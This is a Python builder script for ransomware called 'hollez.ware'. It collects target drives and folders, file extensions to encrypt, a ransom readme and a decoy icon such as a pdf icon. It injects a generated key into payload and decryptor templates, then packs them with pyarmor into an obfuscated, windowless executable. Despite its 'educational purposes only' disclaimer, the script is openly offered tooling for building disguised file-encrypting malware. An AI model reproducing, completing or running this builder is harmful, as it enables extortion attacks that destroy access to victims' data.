import os
import platform
import base64
import datetime
from colorama import Fore

red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
blue = Fore.BLUE
white = Fore.WHITE




def clear():
	operating_system = platform.system()
	if "indows" in operating_system:
		os.system("cls")	
	elif "inux" in operating_system:
		os.system("clear")	
	else:
		pass
	print(green+"""

 _             _  _                                         
| |           | || |                                        
| |__    ___  | || |    ___  ______      __ __ _  _ __  ___ 
| '_ \  / _ \ | || |   / _ \|_  /\ \ /\ / // _` || '__|/ _ \
| | | || (_) || || | _|  __/ / /  \ V  V /| (_| || |  |  __/
|_| |_| \___/ |_||_|(_)\___|/___|  \_/\_/  \__,_||_|   \___|
                                                            


                                                            
                               
                    hollez.ware - ransomware xd
                    
"""+blue+"""Disclaimer	"""+yellow+""":"""+red+""" This tool is for educational purposes only. I am not responsible for your harmful actions!
"""+blue+"""Author		"""+yellow+""":"""+red+""" Justakazh / https://github.com/justakazh 

"""+white)


clear()
#key 
key = base64.urlsafe_b64encode(os.urandom(32)).decode('utf-8')
print("""
Insert disk or target folder
example: E:,D:,C:\\users\\Administrator\\Documents
""")

tdisk = str(input("-> "))
disk = tdisk.split(",")

clear()
# filename
print("""
Insert Filename
example: prize
""")
fname = str(input("-> "))


clear()
# enc_extension
print("""
Insert extension for encrypted files. 
when file encrypted, there will be automaticly change the extension data.docx to data.docx.your_extension
example: .encrypted
""")
ext = str(input("-> "))

clear()

# icon
print("""
Insert Icon
example: icons/pdf.ico
""")
icon = str(input("-> "))

clear()

# target files
print("""
Insert target file extension
example: .docx,.pdf,.jpg,.mp4
""")
target_ext = str(input("-> "))
t_ext = target_ext.split(",")

clear()

# readme
print("""
input readme file
example: readme.txt
""")
r_in = str(input("-> "))
readme = open(r_in, "r").read()

clear()

pwd = os.getcwd()
date = str(datetime.datetime.now().date())
fout = os.path.join(pwd, "output", date)

try:
	os.mkdir("output")
	os.mkdir(fout)
except:
	pass


with open("lib/source.py", "r") as f:
	read = f.read()
	cofig = read.replace("##key##", key)
	cofig = cofig.replace("##disk##", str(disk))
	cofig = cofig.replace("##enc_extension##", str(ext))
	cofig = cofig.replace("##file_to_enc##", str(t_ext))
	cofig = cofig.replace("##readme##", str(readme))
	open(fout+"/"+fname+".py", "w").write(cofig)

with open("lib/source_de.py", "r") as f:
	read = f.read()
	cofig = read.replace("##key##", key)
	cofig = cofig.replace("##disk##", str(disk))
	cofig = cofig.replace("##enc_extension##", str(ext))
	cofig = cofig.replace("##file_to_enc##", str(t_ext))
	open(fout+"/"+"decryptor_"+fname+".py", "w").write(cofig)


os.system('pyarmor pack -e " --onefile --noconsole -i '+icon+'" '+fout+'/'+fname+'.py ')
os.system('pyarmor pack -e " --onefile  " '+fout+'/decryptor_'+fname+'.py ')
open(fout+"/"+"KEY.txt", "w").write(key)
exe_file = os.path.join(fout, "dist")


print("""
\n\n\n
\t\t """+red+"""KEY 	: """+green+key+"""
\t\t """+red+"""Output : """+green+exe_file+red+""" 
\n\t\t """+yellow+"""Please dont lose the KEY !
"""+white)
